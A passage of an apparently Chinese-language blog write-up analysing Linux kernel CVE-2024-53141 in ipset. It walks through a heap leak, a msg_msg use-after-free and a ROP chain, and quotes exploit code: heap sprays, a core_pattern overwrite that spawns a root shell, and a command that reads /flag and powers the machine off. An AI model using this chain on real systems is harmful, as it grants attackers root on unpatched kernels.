<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ext_comment(e, s)	\</span></span><br><span class="line"><span class="meta">((struct ip_set_comment *)(((void *)(e)) + (s)-&gt;offset[IPSET_EXT_ID_COMMENT]))</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_set_comment</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ip_set_comment_rcu</span> __<span class="title">rcu</span> *<span class="title">c</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ip_set_init_comment</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> ip_set_comment *comment,</span></span><br><span class="line"><span class="params">		    <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ip_set_comment_rcu</span> *<span class="title">c</span> =</span> rcu_dereference_protected(comment-&gt;c, <span class="number">1</span>);</span><br><span class="line">	<span class="type">size_t</span> len = ext-&gt;comment ? <span class="built_in">strlen</span>(ext-&gt;comment) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(c)) &#123;</span><br><span class="line">		<span class="built_in">set</span>-&gt;ext_size -= <span class="keyword">sizeof</span>(*c) + <span class="built_in">strlen</span>(c-&gt;str) + <span class="number">1</span>;</span><br><span class="line">		kfree_rcu(c, rcu);</span><br><span class="line">		rcu_assign_pointer(comment-&gt;c, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(len &gt; IPSET_MAX_COMMENT_SIZE))</span><br><span class="line">		len = IPSET_MAX_COMMENT_SIZE;</span><br><span class="line">	c = kmalloc(<span class="keyword">sizeof</span>(*c) + len + <span class="number">1</span>, GFP_ATOMIC);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!c))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	strscpy(c-&gt;str, ext-&gt;comment, len + <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">set</span>-&gt;ext_size += <span class="keyword">sizeof</span>(*c) + <span class="built_in">strlen</span>(c-&gt;str) + <span class="number">1</span>;</span><br><span class="line">	rcu_assign_pointer(comment-&gt;c, c);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(ip_set_init_comment);</span><br></pre></td></tr></table></figure>

<p>​	在 IP 集合的 comment 扩展机制中，当用户为集合元素附加描述信息时，内核通过 ip_set_init_comment 函数动态管理注释内存：若该元素已存在注释（comment-&gt;c 非空），则通过 RCU 机制异步释放旧内存（kfree_rcu）并递减集合扩展数据尺寸（ext_size）；随后根据用户输入的注释字符串长度（上限为 IPSET_MAX_COMMENT_SIZE），以 GFP_ATOMIC 标志在原子上下文中分配 ip_set_comment_rcu 结构体内存（16 字节头部 + 字符串空间），使用安全拷贝函数 strscpy 将用户态数据写入内核缓冲区，最后通过 rcu_assign_pointer 原子更新注释指针并扩展 ext_size。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">ip_set_init_counter</span><span class="params">(<span class="keyword">struct</span> ip_set_counter *counter,</span></span><br><span class="line"><span class="params">		    <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (ext-&gt;bytes != ULLONG_MAX)</span><br><span class="line">		atomic64_set(&amp;(counter)-&gt;bytes, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;bytes));</span><br><span class="line">	<span class="keyword">if</span> (ext-&gt;packets != ULLONG_MAX)</span><br><span class="line">		atomic64_set(&amp;(counter)-&gt;packets, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;packets));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 IP 集合的 counter 扩展机制中，内核通过原子操作实现对网络流量的精细化统计。当用户态指定 bytes 和 packets 初始值时（默认值为 ULLONG_MAX 表示不初始化），ip_set_init_counter 函数会以原子方式将用户提供的 64 位无符号整数值通过类型转换（long long）写入 atomic64_t 类型的计数器结构体成员。这种设计通过 atomic64_set 确保多核环境下流量统计的原子性更新，同时允许动态配置初始统计基数（如重置计数器场景）。这里的两个指针bytes和packets可以通过用户态传入，这样就可以控制指定位置写两个指针。</p>
<h2 id="二-漏洞成因"><a href="#二-漏洞成因" class="headerlink" title="二.漏洞成因"></a>二.漏洞成因</h2><p>​	对于漏洞具体利用，可以利用下述方式可以实现最终的攻击效果。</p>
<h3 id="2-1-泄露出内核堆地址"><a href="#2-1-泄露出内核堆地址" class="headerlink" title="2.1 泄露出内核堆地址"></a>2.1 泄露出内核堆地址</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">        u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bitmap_ip</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">set</span>-&gt;dsize = ip_set_elem_len(<span class="built_in">set</span>, tb, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 0x8, comment length</span></span><br><span class="line">    <span class="built_in">map</span> = ip_set_alloc(<span class="keyword">sizeof</span>(*<span class="built_in">map</span>) + elements * <span class="built_in">set</span>-&gt;dsize); <span class="comment">// 0x58 + 0x8 * 53 == 512, kmalloc-cg-512</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">init_map_ip</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> bitmap_ip *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">        u32 first_ip, u32 last_ip,</span></span><br><span class="line"><span class="params">        u32 elements, u32 hosts, u8 netmask)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">map</span>-&gt;members = bitmap_zalloc(elements, GFP_KERNEL | __GFP_NOWARN); <span class="comment">// 8, kmalloc-8</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	首先就是可以重新看一下bitmap_ip_create的代码，再最开始创建bitmap的时候之前也说过，会根据不同的扩展类型定义不同的set-&gt;dsize，这里对于comment模式来说set-&gt;dsize为8，这样分配出来的map也就是计算出来恰好是512个字节的长度，可以分配kmalloc-cg-512的object。通过上述的gdb调试信息我们也可以清晰的看到对应bitmap的详细结构，其中我们需要关注的就是members也就是bitmap的内容，以及最终扩展的指针。</p>
<p><img src="/./images/CVE-2024-53141/1742260034819.jpg" alt="1742260034819"></p>
<p><img src="/./images/CVE-2024-53141/1742260081534.jpg" alt="1742260081534"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u32</span><br><span class="line"><span class="title function_">ip_to_id</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bitmap_ip *m, u32 ip)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((ip <span class="comment">/* 0xe0000000 */</span> &amp; ip_set_hostmask(m-&gt;netmask) <span class="comment">/* 0xffffffff */</span>) - m-&gt;first_ip <span class="comment">/* 0xffffffcb */</span>) / m-&gt;hosts <span class="comment">/* 1 */</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后便是对于如何通过设置 0xffffffcb (first_ip)， 0xffffffff (last_ip)实现出现越界的写，这里当我们利用CIDR为3进行配置的时候，我们ip就被更新为0xe0000000，通过上述ip_to_id的计算，就可以获得到id的值为0xe0000035，但是之前原理用也有分析，bitmap_ip_adt_elem结构体的id实际上是一个u16的类型，经过阶段之后就是0x35，相当于ip对应的id被认为是0x35，其实这里id就已经指向的是下一个object了。因为之前分配的内存是0x35个dsize，第0x35指针指向的就是下一个object</p>
<p><img src="/./images/CVE-2024-53141/1742261583103.jpg" alt="1742261583103"></p>
<p><img src="/./images/CVE-2024-53141/1742261699346.jpg" alt="1742261699346"></p>
<p>​	这里截图实际上是对于bitmap的内存进行介绍，这里0xffe实际上就是因为0x35指向的是第53个bit，之后会循环的设置bitmap，并且对于对应id的内存写一个kmalloc-cg-192的comment指针。</p>
<p><img src="/./images/CVE-2024-53141/1742261755154.jpg" alt="1742261755154"></p>
<p>​	这里借用一下之前提供链接的图片，可以更加可视化的看出之前讲述的内容，通过覆盖comment指针到下一个object，并且再bitmap前后利用skb_buff进行堆喷，可以将这个指针写道skb_buff的区域，最终可以读取这里的指针地址。</p>
<h3 id="2-2-防止越界写导致程序崩溃"><a href="#2-2-防止越界写导致程序崩溃" class="headerlink" title="2.2 防止越界写导致程序崩溃"></a>2.2 防止越界写导致程序崩溃</h3><p>​	经过上述的攻击，我们就可以获取到一个指向kmalloc-cg-192的指针，但是如果没有设置结束条件的话，会出现一直写指针地址，直到把所有ip都写完（0xe0000000这些无类域间路由全部添加），因此我们再bitmap的起始位置加入ip，使其标注为1，刚才仔细关注gdb调试截图的时候就可以发现这个现象，这样当我们更新到下一个Bitmap的时候就会发现这里已经添加了，就会直接返回停止更新。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_do_add</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bitmap_ip_adt_elem *e, <span class="keyword">struct</span> bitmap_ip *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">         u32 flags, <span class="type">size_t</span> dsize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> !!test_bit(e-&gt;id, <span class="built_in">map</span>-&gt;members); <span class="comment">// [2]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">mtype_add</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="type">void</span> *value, <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> ip_set_ext *mext, u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mtype</span> *<span class="title">map</span> =</span> <span class="built_in">set</span>-&gt;data;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">mtype_adt_elem</span> *<span class="title">e</span> =</span> value;</span><br><span class="line">    <span class="type">int</span> ret = mtype_do_add(e, <span class="built_in">map</span>, flags, <span class="built_in">set</span>-&gt;dsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == IPSET_ADD_FAILED <span class="comment">/* 1 */</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!(flags &amp; IPSET_FLAG_EXIST)) &#123;</span><br><span class="line">            set_bit(e-&gt;id, <span class="built_in">map</span>-&gt;members);</span><br><span class="line">            <span class="keyword">return</span> -IPSET_ERR_EXIST; <span class="comment">// [3]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/./images/CVE-2024-53141/1742262046593.jpg" alt="1742262046593"></p>
<h3 id="2-3-UAF漏洞利用"><a href="#2-3-UAF漏洞利用" class="headerlink" title="2.3 UAF漏洞利用"></a>2.3 UAF漏洞利用</h3><p>​	到了这一步实际上就是攻击利用的关键点，如何利用现有已知的堆地址实现UAF，这里我们可以想到msg_msg结构体，这里我也说一下为什么这样构造（下面的图都是借鉴别人的），对于第一步堆喷skb_buff之后泄露堆地址主要是因为skb_buff的结构体信息<strong>skb_shared_info</strong>实际上存储到object的最后部分，因此我们再object的头部写堆地址并不会导致程序崩溃，而这里再UAF的时候利用msg_msg是因为<strong>msg_msgseg</strong>的next指针是存储到结构体的头部，因此我们只要覆盖一个指针的内容就可以控制msg_msg链，最终删除的时候可以将指定的堆地址一同free。</p>
<p><img src="/./images/CVE-2024-53141/1742266065592.jpg" alt="1742266065592"></p>
<p><img src="/./images/CVE-2024-53141/1742265989434.jpg" alt="1742265989434"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"> <span class="title function_">ip_set_init_counter</span><span class="params">(<span class="keyword">struct</span> ip_set_counter *counter,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (ext-&gt;bytes != ULLONG_MAX)</span><br><span class="line">         atomic64_set(&amp;(counter)-&gt;bytes, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;bytes));</span><br><span class="line">     <span class="keyword">if</span> (ext-&gt;packets != ULLONG_MAX)</span><br><span class="line">         atomic64_set(&amp;(counter)-&gt;packets, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;packets));</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"> <span class="title function_">bitmap_ip_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">         u32 flags)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">bitmap_ip</span> *<span class="title">map</span>;</span></span><br><span class="line">     <span class="comment">// [...]</span></span><br><span class="line">     <span class="built_in">set</span>-&gt;dsize = ip_set_elem_len(<span class="built_in">set</span>, tb, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 0x10, counter length</span></span><br><span class="line">     <span class="built_in">map</span> = ip_set_alloc(<span class="keyword">sizeof</span>(*<span class="built_in">map</span>) + elements * <span class="built_in">set</span>-&gt;dsize); <span class="comment">// 0x58 + 0x10 * 64 == 1112, kmalloc-cg-2k</span></span><br><span class="line">     <span class="comment">// [...]</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>​	对于越界写实际上利用的就是Counter类型，这里之前再介绍部分也有讲述，实际上这里set-&gt;dsize的值是0x10，也就是存储用户态传递过来的两个指针，这里创建的map大小是1112，也是分配kmalloc-cg-2k的object，之后再这个Object前后进行堆喷，这样通过越界写指针就可以覆盖msg_msgseg的Next指针，这样就可以再free的时候一同free指向的object。这里需要注意next指向的内存区域实际上是kmalloc-cg-1k的object，和最开始的skb_buff不是一个，为了增加对于猜测成功率，我们可以再最开始进行堆喷kmalloc-cg-1k的object。</p>
<p><img src="/./images/CVE-2024-53141/1742266615726.jpg" alt="1742266615726"></p>
<p><img src="/./images/CVE-2024-53141/1742266623700.jpg" alt="1742266623700"></p>
<p>​	上图实际上就是对于漏洞利用前后的状态，最终就可以实现UAF漏洞，对于skb_buff删除，后面的利用原理就十分简单了，我们只需要继续堆喷pipe_buffer，之后分配到UAF的skb_buff，并且覆盖函数指针，最终就可以实现rop链。</p>
<h2 id="三-exp利用原理分析"><a href="#三-exp利用原理分析" class="headerlink" title="三.exp利用原理分析"></a>三.exp利用原理分析</h2><p>​	首先对于官方提供的exp来说，是通过利用上述的越界写，通过skb_buff获取堆指针的值，之后利用覆盖msg_seg的next指针，使其指向目标的skb_buff的object，通过释放msg_msg结构体就可以将skb_buff释放形成uaf，最终利用堆喷pipe_buffer，使得可以利用篡改函数指针最终实现rop链子执行，接下来我们就通过exp的流程对于漏洞具体利用进行阐述</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Check if /proc/sys/kernel/core_pattern has been overwritten</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">	<span class="type">int</span> core = open(<span class="string">&quot;/proc/sys/kernel/core_pattern&quot;</span>, O_RDONLY);</span><br><span class="line">	read(core, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	close(core);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(buf, <span class="string">&quot;|/proc/%P/fd/666&quot;</span>, <span class="number">0x10</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">crash</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> memfd = memfd_create(<span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	SYSCHK(sendfile(memfd, open(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="number">0</span>), <span class="number">0</span>, <span class="number">0xffffffff</span>));</span><br><span class="line">	dup2(memfd, <span class="number">666</span>);</span><br><span class="line">	close(memfd);</span><br><span class="line">	<span class="keyword">while</span> (check_core() == <span class="number">0</span>)</span><br><span class="line">		usleep(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Root shell !!&quot;</span>);</span><br><span class="line">	<span class="comment">/* Trigger program crash and cause kernel to executes program from core_pattern which is our &quot;root&quot; binary */</span></span><br><span class="line">	*(<span class="type">size_t</span> *)<span class="number">0</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// #define SYS_pidfd_getfd 438</span></span><br><span class="line">		<span class="type">int</span> pid = strtoull(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">		<span class="type">int</span> pfd = syscall(SYS_pidfd_open, pid, <span class="number">0</span>);</span><br><span class="line">		<span class="type">int</span> stdinfd = syscall(SYS_pidfd_getfd, pfd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="type">int</span> stdoutfd = syscall(SYS_pidfd_getfd, pfd, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="type">int</span> stderrfd = syscall(SYS_pidfd_getfd, pfd, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">		dup2(stdinfd, <span class="number">0</span>);</span><br><span class="line">		dup2(stdoutfd, <span class="number">1</span>);</span><br><span class="line">		dup2(stderrfd, <span class="number">2</span>);</span><br><span class="line">		<span class="comment">/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/</span></span><br><span class="line">		system(<span class="string">&quot;cat /flag;echo o&gt;/proc/sysrq-trigger&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (fork() == <span class="number">0</span>) <span class="comment">// this process is used to trigger core_pattern exploit</span></span><br><span class="line">	&#123;</span><br><span class="line">		set_cpu(<span class="number">0</span>);</span><br><span class="line">		setsid();</span><br><span class="line">		crash(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	set_cpu(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>​	exp首先利用通过 fork 创建子进程执行 crash 函数，子进程利用 memfd_create 创建匿名内存文件并将当前进程镜像（&#x2F;proc&#x2F;self&#x2F;exe）完整拷贝至该文件描述符（memfd），随后通过 dup2 将其绑定到保留的 fd 666，并循环检查 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 是否被内核 ROP 链篡改为管道命令 |&#x2F;proc&#x2F;%P&#x2F;fd&#x2F;666（%P 会在崩溃时替换为进程 PID），一旦检测到篡改成功，立即通过解引用空指针 *(size_t *)0 &#x3D; 0 触发段错误，迫使内核执行核心转储处理逻辑——以 root 权限 启动 fd 666 指向的恶意程序（即攻击者预载的提权代码镜像），最终父进程通过 pidfd_getfd 窃取目标进程的标准输入输出流，执行 cat &#x2F;flag 提取敏感数据并触发系统关机（sysrq-trigger），完成从内存文件隐蔽加载、内核漏洞触发到权限升级的完整攻击链。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// prepare a lot unix_socket for spray skbs</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> val = <span class="number">0x400000</span>;</span><br><span class="line">	SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, spray_fd2[i]));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">0</span>], SOL_SOCKET, SO_SNDBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">1</span>], SOL_SOCKET, SO_SNDBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">0</span>], SOL_SOCKET, SO_RCVBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">1</span>], SOL_SOCKET, SO_RCVBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray a lot skbs ahead for later guess skb chunk addr success rate higher</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x100</span>; j++)</span><br><span class="line">	&#123;</span><br><span class="line">		write(spray_fd2[i][<span class="number">0</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">		write(spray_fd2[i][<span class="number">1</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	该代码通过批量创建 UNIX 域套接字对（AF_UNIX）并操纵其缓冲区参数，实现针对 Linux 内核内存管理机制的系统性预布局。具体原理为：首先通过 socketpair 创建 0x400 对（1024 对）本地流式套接字，每对套接字的两端均通过 setsockopt 将其发送缓冲区（SO_SNDBUF）和接收缓冲区（SO_RCVBUF）设置为 0x400000（4MB），该操作会触发内核调整套接字底层结构体 sock 的 sk_sndbuf 和 sk_rcvbuf 字段值将其设置为0x68000；随后通过嵌套循环向每对套接字的两端持续写入 0x200 字节数据（每次 write 调用），此过程会触发内核协议栈调用 alloc_skb_with_frags 从 skbuff_head_cache 分配 sk_buff 结构体，并通过 kmalloc_reserve 在 kmalloc-cg-1k 缓存池中分配 1k的内存区域进行堆喷，方便后面再给msg_seg结构体的next覆盖成指定堆指针时，该指针指向kmalloc-cg-1k的object的概率更高。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create new unprivileged network IPC namespace to reach vulnerability</span></span><br><span class="line">	SYSCHK(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWIPC));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a lot msgqueue for later to spray msg_msg and msg_msgseg </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		msqid[i] = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line">		SYSCHK(msqid[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// prepare another set of unix_sockets for spray skbs</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; 